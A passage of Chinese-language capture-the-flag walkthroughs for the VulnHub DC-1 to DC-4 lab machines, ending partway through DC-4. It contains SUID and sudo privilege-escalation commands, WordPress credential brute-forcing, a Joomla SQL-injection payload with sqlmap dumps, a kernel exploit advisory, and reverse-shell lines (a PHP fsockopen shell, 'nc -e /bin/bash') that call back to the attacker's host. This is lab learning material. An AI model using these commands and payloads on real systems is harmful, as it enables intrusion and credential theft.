<h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><p>SUID是set uid的简称，它出现在文件所属主权限的执行位上面，标志为 s 。当设置了SUID后，UMSK第一位为4。我们知道，我们账户的密码文件存放在/etc/shadow中，而/etc/shadow的权限为 ———-。也就是说：只有root用户可以对该目录进行操作，而其他用户连查看的权限都没有。当普通用户要修改自己的密码的时候，可以使用passwd这个指令。passwd这个指令在/bin/passwd下，当我们执行这个命令后，就可以修改/etc/shadow下的密码了。那么为什么我们可以通过passwd这个指令去修改一个我们没有权限的文件呢？这里就用到了suid，suid的作用是让执行该命令的用户以该命令拥有者即root的权限去执行，意思是当普通用户执行passwd时会拥有root的权限，这样就可以修改/etc/passwd这个文件了。<br>参考文章:<a href="https://blog.csdn.net/qq_36119192/article/details/82228791#Umask%E3%80%81Suid%E3%80%81Sgid%E3%80%81%E7%B2%98%E6%BB%9E%E4%BD%8D" target="_blank" rel="noopener">Linux下的用户、组和权限</a><br>已知的可用来提权的linux可行性的文件列表如下：<br>nmap,vim,find,bash,more,less,nano,cp<br>发现系统上运行的所有SUID可执行文件</p>
<pre><code>不同系统适用于不同的命令
find / -perm -u=s -type f 2&gt;/dev/null
find / -user root -perm -4000-print2&gt;/dev/null
find / -user root -perm -4000-exec ls -ldb {} \;</code></pre><p><img src="/images/pasted-126.png" alt="upload successful"><br>尝试查看find是否有suid权限</p>
<pre><code>/usr/bin/find /tmp -exec whoami  \;</code></pre><p>find 命令说明<br>-exec 参数后面跟的是command命令，它的终止是以;为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。-exec参数后面跟的就是我们想进一步操作的命令,so，我们可以以root的权限命令执行了</p>
<p>反弹一个shell，当然find和执行命令，我们也可以返回一个root的netcat的后门</p>
<pre><code>/usr/bin/find ./aaa -exec &#39;/bin/sh&#39;  \;</code></pre><pre><code>/usr/bin/find ./aaa -exec netcat -lvp 4444 -e &quot;/bin/sh&quot; \;
netcat 192.168.124.145 4444</code></pre><p><img src="/images/pasted-127.png" alt="upload successful"><br><img src="/images/pasted-135.png" alt="upload successful"><br>最后,获得最后一个flag</p>
<pre><code>cat thefinalflag.txt</code></pre><p>Well done!!!!</p>
<p>Hopefully you’ve enjoyed this and learned some new skills.</p>
<p>You can let me know what you thought of this little journey<br>by contacting me via Twitter - @DCAU7</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p>freebuf:<a href="https://www.freebuf.com/articles/network/218073.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/218073.html</a><br>知乎:<a href="https://zhuanlan.zhihu.com/p/135342104" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/135342104</a><br>W3:<a href="https://medium.com/@w3rallmachines/dc-1-vulnhub-walkthrough-3a2e7042c640" target="_blank" rel="noopener">https://medium.com/@w3rallmachines/dc-1-vulnhub-walkthrough-3a2e7042c640</a></p>
<h2 id="DC2"><a href="#DC2" class="headerlink" title="DC2"></a>DC2</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>靶机下载地址:<a href="http://www.five86.com/downloads/DC-2.zip" target="_blank" rel="noopener">http://www.five86.com/downloads/DC-2.zip</a></p>
<h3 id="基本信息收集"><a href="#基本信息收集" class="headerlink" title="基本信息收集"></a>基本信息收集</h3><p>nmap基本扫描，发现ip地址192.168.124.146，开发端口80，使用的wordpress框架</p>
<pre><code>nmap -A 192.168.124.0/24</code></pre><pre><code>Nmap scan report for dc-2 (192.168.124.146)
Host is up (0.00036s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-generator: WordPress 4.7.10
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: DC-2 &amp;#8211; Just another WordPress site
|_https-redirect: ERROR: Script execution failed (use -d to debug)
MAC Address: 00:0C:29:94:8C:B4 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop</code></pre><p>对端口进一步扫描,发现开发了7744端口(不清楚是什么服务，因该是ssh吧)：</p>
<pre><code>nmap -sS 192.168.124.146 -p 1-65535</code></pre><pre><code>Nmap scan report for dc-2 (192.168.124.146)
Host is up (0.00094s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
80/tcp   open  http
7744/tcp open  raqmon-pdu</code></pre><p>访问192.168.124.146发现访问不了，这里需要改下本地的dns</p>
<pre><code>linux:
vim /etc/hosts
windows:
C:\Windows\System32\drivers\etc</code></pre><p><img src="/images/pasted-128.png" alt="upload successful"><br>访问果然是个wordpress框架<br><img src="/images/pasted-129.png" alt="upload successful"></p>
<h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>发现有flag,点进去，提示用cewl来获取密码，所有应该是爆破密码之类的，且提示自己的密码字典可能无效，且有时没法获得所有密码，提示用其他的身份去登录<br><img src="/images/pasted-130.png" alt="upload successful"></p>
<h3 id="那还说什么cewl搞起"><a href="#那还说什么cewl搞起" class="headerlink" title="那还说什么cewl搞起"></a>那还说什么cewl搞起</h3><p>cewl是通过爬行网站获取关键信息创建一个密码字典</p>
<pre><code>cewl http://dc-2/index.php/flag/ -w dict.txt
-w 输出的文件名称</code></pre><p>发现主题是wordpress，那就扫描一下用户吧，提示密码了，因该是让登录<br>使用wpscan工具：</p>
<p>WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。<br>该扫描器可以实现获取站点用户名，获取安装的所有插件、主题，以及存在漏洞的插件、主题，并提供漏洞信息。同时还可以实现对未加防护的Wordpress站点暴力破解用户名密码。</p>
<p>枚举一下用户,枚举出admin，jerry，tom</p>
<pre><code>wpscan --url http://dc-2 --enumerate u</code></pre><pre><code>
[+] URL: http://dc-2/ [192.168.124.146]
[+] Started: Sat Nov  7 02:23:05 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.10 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://dc-2/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).
 | Found By: Rss Generator (Passive Detection)
 |  - http://dc-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;
 |  - http://dc-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;

[+] WordPress theme in use: twentyseventeen
 | Location: http://dc-2/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: &#39;Version: 1.2&#39;

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 &lt;====================================================&gt; (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] jerry
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</code></pre><p>爆破一下用户名和密码<br>touch users.txt<br>将用户名admin，jerry，tom存入<br>用刚刚抓取的密码字典和用户字典进行爆破</p>
<pre><code>wpscan --url http://dc-2/ -U users.txt -P dict.txt</code></pre><pre><code>[!] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient</code></pre><p>成功爆破出了两个用户名和密码，没有admin的<br><img src="/images/pasted-131.png" alt="upload successful"></p>
<h3 id="尝试登录，登录成功，且在page中发现flag2"><a href="#尝试登录，登录成功，且在page中发现flag2" class="headerlink" title="尝试登录，登录成功，且在page中发现flag2"></a>尝试登录，登录成功，且在page中发现flag2</h3><p><img src="/images/pasted-133.png" alt="upload successful"><br>提示无法利用wordpress采取捷径，尝试令一种方法，之前nmap扫描出了7744端口，那么我们是不是可以尝试ssh登录<br>发现使用tom账号登录成功</p>
<pre><code>ssh tom@192.168.124.146 -p 7744
password:parturient</code></pre><h3 id="尝试读取文件"><a href="#尝试读取文件" class="headerlink" title="尝试读取文件"></a>尝试读取文件</h3><p><img src="/images/pasted-134.png" alt="upload successful"><br>发现被rbash，也就是说是被受限的shell<br>参考链接:<a href="https://www.freebuf.com/articles/system/188989.html" target="_blank" rel="noopener">freebuf</a></p>
<p>先尝试”/“能不能用</p>
<p><img src="/images/pasted-136.png" alt="upload successful"><br>cp命令</p>
<p><img src="/images/pasted-137.png" alt="upload successful"><br>FTP,GDB,main,git没有，发现vi可以用，那就试试被</p>
<pre><code>vi test
set shell=/bin/sh
shell</code></pre><p><img src="/images/pasted-138.png" alt="upload successful"></p>
<p><img src="/images/pasted-139.png" alt="upload successful"></p>
<p><img src="/images/pasted-140.png" alt="upload successful"></p>
<p>更改PATH或SHELL环境变量</p>
<pre><code>查看
export -p</code></pre><pre><code>export HOME=&#39;/home/tom&#39;                                                                                                           
export LANG=&#39;en_US.UTF-8&#39;                                                                                                         
export LOGNAME=&#39;tom&#39;                                                                                                              
export MAIL=&#39;/var/mail/tom&#39;                                                                                                       
export PATH=&#39;/home/tom/usr/bin&#39;                                                                                                   
export PWD=&#39;/home/tom&#39;
export SHELL=&#39;/bin/rbash&#39;
export SHLVL=&#39;1&#39;
export SSH_CLIENT=&#39;192.168.124.139 51336 7744&#39;
export SSH_CONNECTION=&#39;192.168.124.139 51336 192.168.124.146 7744&#39;
export SSH_TTY=&#39;/dev/pts/1&#39;
export TERM=&#39;xterm-256color&#39;
export USER=&#39;tom&#39;
export VIM=&#39;/usr/share/vim&#39;
export VIMRUNTIME=&#39;/usr/share/vim/vim74&#39;
export _=&#39;whoami&#39;</code></pre><p>修改path</p>
<pre><code>export PATH=&quot;/usr/sbin:/usr/bin:/rbin:/bin&quot;</code></pre><p>打开flag3.txt发现，提示要切换用户到jerry<br><img src="/images/pasted-141.png" alt="upload successful"></p>
<h3 id="切换用户，home发现flag4"><a href="#切换用户，home发现flag4" class="headerlink" title="切换用户，home发现flag4"></a>切换用户，home发现flag4</h3><p><img src="/images/pasted-142.png" alt="upload successful"></p>
<p>Good to see that you’ve made it this far - but you’re not home yet.                                                               </p>
<p>You still need to get the final flag (the only flag that really counts!!!).                                                       </p>
<p>No hints here - you’re on your own now.  :-)                                                                                      </p>
<p>Go on - git outta here!!!!</p>
<h3 id="这里提示git提权"><a href="#这里提示git提权" class="headerlink" title="这里提示git提权"></a>这里提示git提权</h3><pre><code>sudo git help config</code></pre><p><img src="/images/pasted-143.png" alt="upload successful"><br>成功获取root权限，读取文件</p>
<p><img src="/images/pasted-146.png" alt="upload successful"></p>
<p>Congratulatons!!!</p>
<p>A special thanks to all those who sent me tweets<br>and provided me with feedback - it’s all greatly<br>appreciated.</p>
<p>If you enjoyed this CTF, send me a tweet via @DCAU7.</p>
<h3 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/zaqzzz/p/12075132.html#1suid%E6%8F%90%E6%9D%83" target="_blank" rel="noopener">linux提权</a></p>
<p><a href="https://www.freebuf.com/articles/system/188989.html" target="_blank" rel="noopener">freebuf</a></p>
<p><a href="https://blog.csdn.net/qq_41453285/article/details/100898310" target="_blank" rel="noopener">wpscan</a></p>
<p><a href="https://www.cnblogs.com/yurang/p/12735229.html" target="_blank" rel="noopener"> vulnhub: DC 2</a></p>
<h2 id="DC3"><a href="#DC3" class="headerlink" title="DC3"></a>DC3</h2><h3 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h3><p>靶场的下载：<a href="http://www.five86.com/downloads/DC-3-2.zip" target="_blank" rel="noopener">http://www.five86.com/downloads/DC-3-2.zip</a></p>
<h3 id="基本信息收集-1"><a href="#基本信息收集-1" class="headerlink" title="基本信息收集"></a>基本信息收集</h3><pre><code>nmap -sS A 192.168.124.0/24</code></pre><pre><code>Nmap scan report for 192.168.124.147
Host is up (0.00041s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home
MAC Address: 00:0C:29:EF:73:10 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.41 ms 192.168.124.147</code></pre><p>对端口的进一步扫描，没有发现其他的端口</p>
<pre><code>nmap 192.168.124.147</code></pre><p>访问192.168.124.147的80端口，发现提示，和cms是joomla<br><img src="/images/pasted-147.png" alt="upload successful"><br>使用joomscan进行进一步扫描</p>
<p>它是一个Joomla扫描仪。 它将帮助网络开发人员和网站管理员帮助确定已部署的Joomla网站可能存在的安全漏洞。</p>
<pre><code>安装joomscan(kali中)
apt-get install joomscan
joomscan --url http://192.168.124.147</code></pre><p><img src="/images/pasted-148.png" alt="upload successful"><br>也可使用CMSseek进一步扫描</p>
<pre><code>安装CMSseek
git clone https://github.com/Tuhinshubhra/CMSeeK
使用
python3 cmseek.py --url 192.168.124.147</code></pre><p>信息一样<br><img src="/images/pasted-149.png" alt="upload successful"></p>
<h3 id="搜索joomla漏洞"><a href="#搜索joomla漏洞" class="headerlink" title="搜索joomla漏洞"></a>搜索joomla漏洞</h3><pre><code>searchsploit joomla 3.7.0</code></pre><p><img src="/images/pasted-150.png" alt="upload successful"><br>打开查看漏洞详情</p>
<pre><code>cat /usr/share/exploitdb/exploits/php/webapps/42033.txt </code></pre><p>查看发现存在sql注入，具体漏原理<a href="https://paper.seebug.org/305/" target="_blank" rel="noopener">seebug</a><br>简单来说就是<br>com_fields组件，对请求数据没有进行过滤，从而导致sql注入，未过滤位置<br><img src="/images/pasted-152.png" alt="upload successful"><br><img src="/images/pasted-151.png" alt="upload successful"><br>测试一下</p>
<pre><code>http://192.168.124.147/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x7e,database()),1)</code></pre><p><img src="/images/pasted-153.png" alt="upload successful"></p>
<h3 id="sqlmap进行注入"><a href="#sqlmap进行注入" class="headerlink" title="sqlmap进行注入"></a>sqlmap进行注入</h3><pre><code>爆数据库名
sqlmap -u &quot;http://192.168.124.147/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x7e,database()),1)&quot; --dbs</code></pre><p><img src="/images/pasted-154.png" alt="upload successful"></p>
<pre><code>爆表名
qlmap -u &quot;http://192.168.124.147/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x7e,database()),1)&quot; -D &quot;joomladb&quot; --tables</code></pre><p><img src="/images/pasted-155.png" alt="upload successful"></p>
<pre><code>爆字段名
sqlmap -u &quot;http://192.168.124.147/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x7e,database()),1)&quot; -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns</code></pre><p><img src="/images/pasted-156.png" alt="upload successful"></p>
<pre><code>爆数据
sqlmap -u &quot;http://192.168.124.147/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x7e,database()),1)&quot; -D &quot;joomladb&quot; -T &quot;#__users&quot; -C name,password --dump</code></pre><p><img src="/images/pasted-157.png" alt="upload successful"></p>
<h3 id="尝试破解密码"><a href="#尝试破解密码" class="headerlink" title="尝试破解密码"></a>尝试破解密码</h3><pre><code>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</code></pre><pre><code>创建文件
echo &#39;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#39; &gt; test
爆破密码
john test
john test --show</code></pre><p>John the Ripper (“JtR”) 是一个非常有用的工具。这是一个快速的密码破解器，适用于Windows和许多Linux系统。它具有很多功能，对于很多密码破解均有奇效。</p>
<p><img src="/images/pasted-158.png" alt="upload successful"></p>
<h3 id="登录写shell页面"><a href="#登录写shell页面" class="headerlink" title="登录写shell页面"></a>登录写shell页面</h3><p>登录网站:<a href="http://192.168.124.147/administrator/" target="_blank" rel="noopener">http://192.168.124.147/administrator/</a><br>编写新页面<br><img src="/images/pasted-159.png" alt="upload successful"><br>点击编写<br><img src="/images/pasted-162.png" alt="upload successful"><br>new file编写<br><img src="/images/pasted-163.png" alt="upload successful"><br><img src="/images/pasted-165.png" alt="upload successful"></p>
<h3 id="蚁剑链接"><a href="#蚁剑链接" class="headerlink" title="蚁剑链接"></a>蚁剑链接</h3><p><img src="/images/pasted-166.png" alt="upload successful"></p>
<p><img src="/images/pasted-167.png" alt="upload successful"></p>
<h3 id="尝试提权"><a href="#尝试提权" class="headerlink" title="尝试提权"></a>尝试提权</h3><p>尝试suid提权</p>
<pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p>发现没有可提权程序</p>
<p><img src="/images/pasted-168.png" alt="upload successful"><br>尝试命令提权，发现咩用<br>尝试linux内核提权</p>
<pre><code>uname -a
cat /etc/issue</code></pre><p><img src="/images/pasted-170.png" alt="upload successful"><br>寻找内核提权脚本</p>
<pre><code>searchsploit Ubuntu 16.04</code></pre><p>尝试一下<br><img src="/images/pasted-169.png" alt="upload successful"></p>
<pre><code>cat \usr\share\exploitdb\exploits\linux\local\39772.txt</code></pre><pre><code>Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=808

In Linux &gt;=4.4, when the CONFIG_BPF_SYSCALL config option is set and the
kernel.unprivileged_bpf_disabled sysctl is not explicitly set to 1 at runtime,
unprivileged code can use the bpf() syscall to load eBPF socket filter programs.
These conditions are fulfilled in Ubuntu 16.04.

When an eBPF program is loaded using bpf(BPF_PROG_LOAD, ...), the first
function that touches the supplied eBPF instructions is
replace_map_fd_with_map_ptr(), which looks for instructions that reference eBPF
map file descriptors and looks up pointers for the corresponding map files.
This is done as follows:

        /* look for pseudo eBPF instructions that access map FDs and
         * replace them with actual map pointers
         */
        static int replace_map_fd_with_map_ptr(struct verifier_env *env)
        {
                struct bpf_insn *insn = env-&gt;prog-&gt;insnsi;
                int insn_cnt = env-&gt;prog-&gt;len;
                int i, j;

                for (i = 0; i &lt; insn_cnt; i++, insn++) {
                        [checks for bad instructions]

                        if (insn[0].code == (BPF_LD | BPF_IMM | BPF_DW)) {
                                struct bpf_map *map;
                                struct fd f;

                                [checks for bad instructions]

                                f = fdget(insn-&gt;imm);
                                map = __bpf_map_get(f);
                                if (IS_ERR(map)) {
                                        verbose(&quot;fd %d is not pointing to valid bpf_map\n&quot;,
                                                insn-&gt;imm);
                                        fdput(f);
                                        return PTR_ERR(map);
                                }

                                [...]
                        }
                }
                [...]
        }


__bpf_map_get contains the following code:

/* if error is returned, fd is released.
 * On success caller should complete fd access with matching fdput()
 */
struct bpf_map *__bpf_map_get(struct fd f)
{
        if (!f.file)
                return ERR_PTR(-EBADF);
        if (f.file-&gt;f_op != &amp;bpf_map_fops) {
                fdput(f);
                return ERR_PTR(-EINVAL);
        }

        return f.file-&gt;private_data;
}

The problem is that when the caller supplies a file descriptor number referring
to a struct file that is not an eBPF map, both __bpf_map_get() and
replace_map_fd_with_map_ptr() will call fdput() on the struct fd. If
__fget_light() detected that the file descriptor table is shared with another
task and therefore the FDPUT_FPUT flag is set in the struct fd, this will cause
the reference count of the struct file to be over-decremented, allowing an
attacker to create a use-after-free situation where a struct file is freed
although there are still references to it.

A simple proof of concept that causes oopses/crashes on a kernel compiled with
memory debugging options is attached as crasher.tar.


One way to exploit this issue is to create a writable file descriptor, start a
write operation on it, wait for the kernel to verify the file&#39;s writability,
then free the writable file and open a readonly file that is allocated in the
same place before the kernel writes into the freed file, allowing an attacker
to write data to a readonly file. By e.g. writing to /etc/crontab, root
privileges can then be obtained.

There are two problems with this approach:

The attacker should ideally be able to determine whether a newly allocated
struct file is located at the same address as the previously freed one. Linux
provides a syscall that performs exactly this comparison for the caller:
kcmp(getpid(), getpid(), KCMP_FILE, uaf_fd, new_fd).

In order to make exploitation more reliable, the attacker should be able to
pause code execution in the kernel between the writability check of the target
file and the actual write operation. This can be done by abusing the writev()
syscall and FUSE: The attacker mounts a FUSE filesystem that artificially delays
read accesses, then mmap()s a file containing a struct iovec from that FUSE
filesystem and passes the result of mmap() to writev(). (Another way to do this
would be to use the userfaultfd() syscall.)

writev() calls do_writev(), which looks up the struct file * corresponding to
the file descriptor number and then calls vfs_writev(). vfs_writev() verifies
that the target file is writable, then calls do_readv_writev(), which first
copies the struct iovec from userspace using import_iovec(), then performs the
rest of the write operation. Because import_iovec() performs a userspace memory
access, it may have to wait for pages to be faulted in - and in this case, it
has to wait for the attacker-owned FUSE filesystem to resolve the pagefault,
allowing the attacker to suspend code execution in the kernel at that point
arbitrarily.

An exploit that puts all this together is in exploit.tar. Usage:

user@host:~/ebpf_mapfd_doubleput$ ./compile.sh
user@host:~/ebpf_mapfd_doubleput$ ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you&#39;ll have a root shell in &lt;=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
root@host:~/ebpf_mapfd_doubleput# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)

This exploit was tested on a Ubuntu 16.04 Desktop system.

Fix: https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7


Proof of Concept: https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552
Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</code></pre><p>提示有exp的地址，下载</p>
<pre><code>https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</code></pre><p>解压上传到靶机目录，解压</p>
<pre><code>tar -xf exploit.tar
cd ebpf_mapfd_doubleput_exploit
./compile.sh</code></pre><p>先反弹一下交互形的shell<br>创建一个phpshell.php文件，写入</p>
<pre><code>&lt;?php
system(&quot;$sock=fsockopen(\&quot;192.168.124.139\&quot;,4444);exec(\&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);&quot;);
?&gt;</code></pre><p>kali端</p>
<pre><code>netcat -l -p 4444</code></pre><p>蚁剑执行</p>
<pre><code>php phpshell.php</code></pre><p><img src="/images/pasted-176.png" alt="upload successful"><br>kali收到反弹的shell</p>
<p><img src="/images/pasted-177.png" alt="upload successful"><br>执行刚刚编译的exp</p>
<p><img src="/images/pasted-178.png" alt="upload successful"><br>提权成功<br>寻找flag  root下</p>
<p><img src="/images/pasted-179.png" alt="upload successful"><br>成功获得flag</p>
<pre><code> __        __   _ _   ____                   _ _ _ _ 
 \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |
  \ \ /\ / / _ \ | | | | | |/ _ \| &#39;_ \ / _ \ | | | |
   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|
    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)


Congratulations are in order.  :-)

I hope you&#39;ve enjoyed this challenge as I enjoyed making it.

If there are any ways that I can improve these little challenges,
please let me know.

As per usual, comments and complaints can be sent via Twitter to @DCAU7

Have a great day!!!!</code></pre><h3 id="参考文章-2"><a href="#参考文章-2" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/yurang/p/12735286.html" target="_blank" rel="noopener">https://www.cnblogs.com/yurang/p/12735286.html</a></p>
<p><a href="https://www.exploit-db.com/exploits/44227" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44227</a></p>
<h2 id="DC4"><a href="#DC4" class="headerlink" title="DC4"></a>DC4</h2><h3 id="靶场的搭建"><a href="#靶场的搭建" class="headerlink" title="靶场的搭建"></a>靶场的搭建</h3><p>靶场下载地址:<a href="https://download.vulnhub.com/dc/DC-4.zip" target="_blank" rel="noopener">https://download.vulnhub.com/dc/DC-4.zip</a></p>
<h3 id="基本信息收集-2"><a href="#基本信息收集-2" class="headerlink" title="基本信息收集"></a>基本信息收集</h3><p>nmap扫描网段</p>
<pre><code>nmap -sS -A 192.168.124.0/24</code></pre><pre><code>Nmap scan report for 192.168.124.148
Host is up (0.00022s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)
|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)
|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)
80/tcp open  http    nginx 1.15.10
|_http-server-header: nginx/1.15.10
|_http-title: System Tools
MAC Address: 00:0C:29:40:C9:C1 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.22 ms 192.168.124.148</code></pre><p>得到基本信息开放了80，ssh端口，操作系统Debian<br>先爆破一下ssh吧(无结果)</p>
<pre><code>nmap --script=ssh-brute 192.168.124.148</code></pre><p>查看80端口，发现不是cms，是个登录框，提醒admin登录<br><img src="/images/pasted-180.png" alt="upload successful"><br>尝试sql,burpsuite跑一下字典没结果，那我再跑一下看看有过滤没(我丢还是啥结果没有)，看来没有注入呀<br><img src="/images/pasted-181.png" alt="upload successful"><br><img src="/images/pasted-182.png" alt="upload successful"><br>让我百度一下题解，我丢，暴力破解密码可还行，那是时候祭出我100w的大字典了(heng!)<br>再见没爆破出来直接看答案(我一点也不happy)，看来字典有的落后了</p>
<pre><code>账号:admin
密码:happy</code></pre><h3 id="登录进去"><a href="#登录进去" class="headerlink" title="登录进去"></a>登录进去</h3><p>尝试登录发现是个命令执行功能，抓包看看，更改一下ls，发现能读取文件，那先读取comment看看是怎么执行的<br><img src="/images/pasted-183.png" alt="upload successful"></p>
<p><img src="/images/pasted-184.png" alt="upload successful"><br>我丢，直接shell_exec(),那直接反弹shell</p>
<pre><code>nc 192.168.124.139 4444 -e /bin/bash
kali端
netcat -l -p 4444</code></pre><p><img src="/images/pasted-185.png" alt="upload successful"><br>反弹一下交互shell</p>
<pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/sh&quot;)&#39;</code></pre><p><img src="/images/pasted-187.png" alt="upload successful"></p>
<h3 id="发现密码"><a href="#发现密码" class="headerlink" title="发现密码"></a>发现密码</h3><p>在下面目录发现old-passwords.bak</p>
<p>/home/jim/backups<br>说是old密码,打开</p>
<pre><code>cat old-passwords.bak
000000
12345
iloveyou
1q2w3e4r5t
1234
123456a
qwertyuiop
